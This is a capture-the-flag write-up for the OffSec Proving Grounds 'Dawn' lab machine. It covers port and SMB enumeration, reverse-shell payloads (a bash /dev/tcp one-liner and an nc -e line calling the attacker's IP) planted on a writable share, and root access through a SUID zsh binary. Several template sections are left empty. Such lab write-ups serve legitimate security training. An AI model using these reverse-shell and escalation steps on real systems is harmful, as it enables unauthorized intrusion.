---
title: Dawn
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
# Machine
## OS
## Level

---
# Reconnaissance
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Dawn]
└─$ sudo nmap -Pn -p- -sS -oN open-port_scan.txt --open 192.168.123.11                 
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-30 03:56 +0900
Nmap scan report for 192.168.123.11
Host is up (0.095s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 34.24 seconds

```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Dawn]
└─$ sudo nmap -Pn -p80,139,445,3306 -sSCV -A -oN full_tcp-scan.txt --open 192.168.123.11
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-30 03:57 +0900
Nmap scan report for 192.168.123.11
Host is up (0.092s latency).

PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MariaDB 5.5.5-10.3.15
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.15-MariaDB-1
|   Thread ID: 14
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolNew, SupportsCompression, FoundRows, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, InteractiveClient, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, ODBCClient, ConnectWithDatabase, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: i-CH~e_,]m1FP=#3uul=
|_  Auth Plugin Name: mysql_native_password
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 4 hops
Service Info: Host: DAWN

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: dawn
|   NetBIOS computer name: DAWN\x00
|   Domain name: dawn
|   FQDN: dawn.dawn
|_  System time: 2026-05-29T14:58:03-04:00
| smb2-time: 
|   date: 2026-05-29T18:58:05
|_  start_date: N/A
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   92.23 ms 192.168.45.1
2   92.05 ms 192.168.45.254
3   92.26 ms 192.168.251.1
4   91.32 ms 192.168.123.11

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.48 seconds

```

# 80

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Dawn]
└─$ gobuster dir -u http://192.168.123.11 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30

===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.123.11
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
logs                 (Status: 301) [Size: 315] [--> http://192.168.123.11/logs/]
server-status        (Status: 403) [Size: 302]
cctv                 (Status: 301) [Size: 315] [--> http://192.168.123.11/cctv/]
Progress: 29999 / 29999 (100.00%)
===============================================================
Finished
===============================================================
```

http://192.168.123.11/logs/management.log

![](../../../assets/images/Pasted%20image%2020260530092759.png)

# 445

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Dawn]
└─$ smbmap -H 192.168.123.11

[+] IP: 192.168.123.11:445      Name: 192.168.123.11            Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        ITDEPT                                                  READ, WRITE     PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.9.5-Debian)
[|] Closing connections..                                                                                           [/] Closing connections..                                                                                           [-] Closing connections..                                                                                           [*] Closed 1 connections   
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Dawn]
└─$ smbclient -L //192.168.123.11/                                       
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        ITDEPT          Disk      PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            WIN2K3STDVIC
```

```zsh

```

---

# Initial Access


```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Dawn]
└─$ echo "bash -c 'exec bash -i >& /dev/tcp/192.168.45.214/3030 0>&1'" > product-control
```
*This script was success.*
or 

```zsh
echo 'nc 192.168.45.219 3030 -e /bin/bash' > web-control
```
*This script was not execute*

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Dawn]
└─$ smbclient //192.168.123.11/ITDEPT
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> put web-control 
putting file web-control as \web-control (0.1 kB/s) (average 0.1 kB/s)
smb: \> put product-control 
putting file product-control as \product-control (0.2 kB/s) (average 0.2 kB/s)
smb: \> 
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Dawn]
└─$ ~/Tools/RevShell/penelope/penelope.py -p 3030
[+] Listening for reverse shells on 0.0.0.0:3030 -> 127.0.0.1 • 192.168.11.99 • 192.168.189.128 • 192.168.56.99 • 172.18.0.1 • 172.17.0.1 • 192.168.45.214
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => dawn 192.168.123.11 Linux-x86_64 👤 dawn(1000) 😍️ Session ID <1>
[+] Upgrading shell to PTY...
[+] PTY upgrade successful via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/dawn~192.168.123.11-Linux-x86_64/2026_05_30-09_39_03-918.log
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] [New Reverse Shell] => dawn 192.168.123.11 Linux-x86_64 👤 dawn(1000) 😍️ Session ID <2>
dawn@dawn:~$ 

```

```zsh
dawn@dawn:~$ id
uid=1000(dawn) gid=1000(dawn) groups=1000(dawn),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)
dawn@dawn:~$ ls
ITDEPT  local.txt
dawn@dawn:~$ cat local.txt

[+] [New Reverse Shell] => dawn 192.168.123.11 Linux-x86_64 👤 dawn(1000) 😍️ Session ID <3>
dawn@dawn:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:ab:ec:c3 brd ff:ff:ff:ff:ff:ff
    inet 192.168.123.11/24 brd 192.168.123.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feab:ecc3/64 scope link 
       valid_lft forever preferred_lft forever
```

```zsh
dawn@dawn:~$ find / -type f -perm -04000 -ls 2>/dev/null

   163813    844 -rwsr-xr-x   1 root     root         861568 Feb  4  2019 /usr/bin/zsh

```

![](../../../assets/images/Pasted%20image%2020260530094618.png)
```zsh
dawn@dawn:~$ /usr/bin/zsh
dawn# id
[+] [New Reverse Shell] => dawn 192.168.123.11 Linux-x86_64 👤 dawn(1000) 😍️ Session ID <9>
uid=1000(dawn) gid=1000(dawn) euid=0(root) groups=1000(dawn),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)
dawn# whoami
root
dawn# cat /root/proof.txt
d3ba63fe07653b2d5db9e1fd3ee2e310
dawn# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:ab:ec:c3 brd ff:ff:ff:ff:ff:ff
    inet 192.168.123.11/24 brd 192.168.123.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feab:ecc3/64 scope link 
       valid_lft forever preferred_lft forever

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```
---

# Privilege Escalation

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```


<details markdown="1">
<summary>Walkthrough</summary>

```zsh

```

</details>